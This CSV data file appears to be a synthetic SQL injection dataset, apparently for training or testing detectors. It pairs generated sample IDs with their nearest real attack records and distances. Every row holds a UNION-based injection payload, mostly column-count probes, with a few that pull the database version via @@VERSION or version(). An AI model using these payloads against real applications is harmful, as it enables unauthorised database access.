id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001603,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.579207758562828
CTGAN_001604,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.865789263410794
CTGAN_001605,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,5.669163897756749
CTGAN_001606,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,4.972952473854578
CTGAN_001607,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.944851359031371
CTGAN_001608,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,4.756626985692734
CTGAN_001609,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.076983466519368
CTGAN_001610,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.904240211174443
CTGAN_001611,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,6.238303773695316
CTGAN_001612,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,3.9216097973920014
CTGAN_001613,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,4.100177695658526
CTGAN_001614,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,4.841684834461138
CTGAN_001615,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,9.35702630909897
CTGAN_001616,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,6.598007801518075
CTGAN_001617,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,4.270898809692222
CTGAN_001618,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,6.724301603633311
CTGAN_001619,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,5.439487643376114
CTGAN_001620,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,7.185865074704166
CTGAN_001621,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.032969830548962
CTGAN_001622,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.327405690807867
CTGAN_001623,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.747377896727296
CTGAN_001624,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.899138312406055
CTGAN_001625,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.999025043942726
CTGAN_001626,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,4.9174436625798235
CTGAN_001627,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,5.494291483382008
CTGAN_001628,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,6.160943253540951
CTGAN_001629,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,4.9201533676999665
CTGAN_001630,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.5241410087571285
CTGAN_001631,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,7.387083089288189
CTGAN_001632,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,6.580536642872849
CTGAN_001633,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,5.732546233273539
CTGAN_001634,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,5.6770097522662475
CTGAN_001635,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,4.554228362725058
CTGAN_001636,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,3.720542783435623
CTGAN_001637,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,7.654598183061981
CTGAN_001638,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.228684462527554
CTGAN_001639,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,7.575346446123271
CTGAN_001640,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,6.3125629583957625
CTGAN_001641,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,7.480157012076339
CTGAN_001642,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,6.26638744141446
CTGAN_001643,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,8.262622057521446
CTGAN_001644,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.975411173862198
CTGAN_001645,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.753854304152957
CTGAN_001646,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.1709105801801964
CTGAN_001647,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.390337794123867
CTGAN_001648,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.024034443651033
CTGAN_001649,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,4.7438715359794
CTGAN_001650,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,4.916196623714286
CTGAN_001651,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,4.306158549305924
CTGAN_001652,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,6.343029670757908
CTGAN_001653,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,5.171800044735
CTGAN_001654,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,5.831159605116067
CTGAN_001655,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,7.576589294604319
CTGAN_001656,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,5.516029653015507
CTGAN_001657,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,6.624033101412149
CTGAN_001658,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.074263123323518
CTGAN_001659,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,6.914296225804003
CTGAN_001660,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,5.963093252580661
CTGAN_001661,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.96575729301151
CTGAN_001662,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,8.064415267888716
CTGAN_001663,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.36495619163861
CTGAN_001664,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.18539610210914
CTGAN_001665,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,4.79431125969983
CTGAN_001666,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,7.069076301999058
CTGAN_001667,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,5.139977423428937
CTGAN_001668,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,4.758056975913605
CTGAN_001669,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,5.30173864623368
CTGAN_001670,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.299270168054839
CTGAN_001671,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,8.224332815196561
CTGAN_001672,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,4.866741865148967
CTGAN_001673,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,5.818575617030614
CTGAN_001674,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.47074128192106
CTGAN_001675,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.8993751601737925
CTGAN_001676,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,6.5486481440843285
CTGAN_001677,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,8.798042055675465
CTGAN_001678,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,6.942024572641282
CTGAN_001679,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.694616846342417
CTGAN_001680,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,8.428892978782708
CTGAN_001681,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,5.321061512321481
CTGAN_001682,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,9.904964243363477
CTGAN_001683,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,5.380748272282985
CTGAN_001684,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,4.919592318820043
CTGAN_001685,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.12833520793241
CTGAN_001686,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.839624899462923
CTGAN_001687,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,5.514638892404036
CTGAN_001688,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.715620291864803
CTGAN_001689,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,8.374730707835354
CTGAN_001690,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,4.849274214536002
CTGAN_001691,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,5.601370648217009
CTGAN_001692,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,7.415122115474859
CTGAN_001693,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,5.202227144080952
CTGAN_001694,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.572594323792622
CTGAN_001695,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,7.3540426626285464
CTGAN_001696,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,5.28227353095246
CTGAN_001697,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,6.415400815152631
CTGAN_001698,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,5.456777741165851
CTGAN_001699,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.496581864873092
CTGAN_001700,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,6.350980249931689
CTGAN_001701,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,4.535853774799562
CTGAN_001702,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,5.875754915573722
CTGAN_001703,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,6.125786716274244
CTGAN_001704,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,5.247374824527152
CTGAN_001705,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,7.526063657028074
CTGAN_001706,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,6.430950589638284
CTGAN_001707,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,9.116418919512496
CTGAN_001708,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.310144808025727
CTGAN_001709,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,4.861585880822007
CTGAN_001710,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,4.869572669620876
CTGAN_001711,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.610082296582965
CTGAN_001712,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,5.660119278440556
CTGAN_001713,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,6.464515564336217
CTGAN_001714,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,5.080338392870509
CTGAN_001715,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,8.221814749703961
CTGAN_001716,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,7.5840269241144105
CTGAN_001717,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,5.770220956260976
CTGAN_001718,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,7.359172821871323
CTGAN_001719,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,6.5776209851376946
CTGAN_001720,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,8.017353921994093
CTGAN_001721,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.080136331235478
CTGAN_001722,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,5.817355908792499
CTGAN_001723,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,6.442157890618297
CTGAN_001724,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.791527633873372
CTGAN_001725,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,5.366669694299359
CTGAN_001726,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,4.9474109202114755
CTGAN_001727,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.53163348407434
CTGAN_001728,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.169330097082035
CTGAN_001729,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.0094586252509945
CTGAN_001730,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.578153624579337
CTGAN_001731,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.928700731893999
CTGAN_001732,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.0227558745557515
CTGAN_001733,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,6.099307615507878
CTGAN_001734,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.682306144297393
CTGAN_001735,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,6.165524496701529
CTGAN_001736,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,5.680938376712834
CTGAN_001737,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,8.700973333990023
CTGAN_001738,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,6.704967875127159
CTGAN_001739,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,6.179597812334342
CTGAN_001740,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,6.107801342387615
CTGAN_001741,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,5.449455754010368
CTGAN_001742,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.855936987025705
CTGAN_001743,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,6.745076782662743
CTGAN_001744,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,6.7969306501501014
CTGAN_001745,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.725069217814632
CTGAN_001746,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,6.890230759359563
CTGAN_001747,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,6.294724623767741
CTGAN_001748,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.416696192392555
CTGAN_001749,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,5.028567599245668
CTGAN_001750,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.368615493502319
CTGAN_001751,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,6.093954616112225
CTGAN_001752,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,4.798998305420527
CTGAN_001753,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,5.036242238845697
CTGAN_001754,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,7.765124519692981
CTGAN_001755,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.450922704200232
CTGAN_001756,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,5.98235288213016
CTGAN_001757,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,6.245491590111725
CTGAN_001758,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,5.112917281878601
CTGAN_001759,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,5.28361362307473
CTGAN_001760,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.408031791748742
CTGAN_001761,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000079,5.644923140685908
CTGAN_001762,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,5.016619526886813
CTGAN_001763,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.321300271859692
CTGAN_001764,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,6.1545783417829325
CTGAN_001765,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,8.136034270014243
CTGAN_001766,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,7.7606881154695175
CTGAN_001767,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,5.219890693249513
CTGAN_001768,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,5.731474908169795
CTGAN_001769,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,7.077453281828953
CTGAN_001770,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,5.684140909695629
CTGAN_001771,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,5.4431556518350295
CTGAN_001772,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,4.78804614075305
CTGAN_001773,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,4.390013711839422
CTGAN_001774,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,7.972764757740791
CTGAN_001775,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,5.534898361019735
CTGAN_001776,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,5.617381372667976
CTGAN_001777,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,4.858025301216402
CTGAN_001778,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.843530248729493
CTGAN_001779,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,8.322045898939372
CTGAN_001780,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,6.672992030718886
CTGAN_001781,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,4.819488684390076
CTGAN_001782,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,6.452501679994635
CTGAN_001783,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,7.464335236611509
CTGAN_001784,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,3.927245344242926
CTGAN_001785,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.813275804671846
CTGAN_001786,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.202870898258111
CTGAN_001787,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,6.040517257719369
CTGAN_001788,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,5.357405085270359
CTGAN_001789,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,4.522431729472085
CTGAN_001790,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,5.1050532795221715
CTGAN_001791,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000130,5.811694781415121
CTGAN_001792,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,5.65499000290531
CTGAN_001793,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,5.9743386538894345
CTGAN_001794,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,4.601233966224483
CTGAN_001795,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,5.643889062281238
CTGAN_001796,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,5.8772962044483394
CTGAN_001797,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,5.236463802583675
